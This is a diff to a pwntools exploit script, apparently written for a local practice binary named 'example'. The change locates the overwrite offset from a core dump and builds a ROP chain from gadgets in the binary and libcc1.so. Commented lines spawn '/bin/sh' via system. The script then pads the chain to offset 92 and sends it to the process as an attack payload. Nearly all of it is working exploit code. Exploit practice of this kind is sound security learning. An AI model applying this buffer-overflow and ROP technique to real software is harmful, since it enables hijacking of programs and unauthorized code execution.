@@ -28,17 +28,40 @@ with process('./example') as p:
     p.wait()  # Wait for the program to crash
 
 # Examine the crash to find the offset
-core = Coredump(get_corefile_location("example", p.pid))
-offset = cyclic_find(core.read(core.eip, 4))  # rsp holds the overwritten return address
+def print_details(name: str, pid: int) -> str:
+    core = Coredump(get_corefile_location(name, pid))
+    for k,v in core.registers.items():
+        new_offset = cyclic_find(v)
+        # print(f"{k=},{v=},{new_offset}")
+        if new_offset != -1:
+            print(f"overwrote register {k} with value {v} at offset {new_offset}")
 
-for k,v in core.registers.items():
-    new_offset = cyclic_find(v)
-    # print(f"{k=},{v=},{new_offset}")
-    if new_offset != -1:
-        print(f"overwrote register {k} with value {v} at offset {new_offset}")
 
-print(f"Offset to overwrite return address: {offset}")
+print_details("example", p.pid)
+# Our ROP chain will use gadgets from the following ELFs
+binary = ELF('./example')
+rop = ROP([binary,
+           ELF('/usr/lib/gcc/x86_64-linux-gnu/12/libcc1.so')])
 
+# Write a ROP chain that calls some libc functions!
+#  rop.call('system', ['/bin/sh'])
+#  rop.call('exit', [0])
+rop.win()
+
+print('ropchain:')
+print(rop.dump())
+
+ropchain = rop.chain()
+offset = 92
+payload = flat({offset: ropchain}, filler=cycle(b'A'))[:-2]
+print(f"{payload=}")
+
+print("attacking...")
+with process(binary.path) as example:
+    print(example.recvline(timeout=5))
+    example.sendline(payload)
+    # print(example.recvline(timeout=5))
+    print_details("example", example.pid)
 
 """
 # # Override pwntools's default cache directory to your secret tmp directory
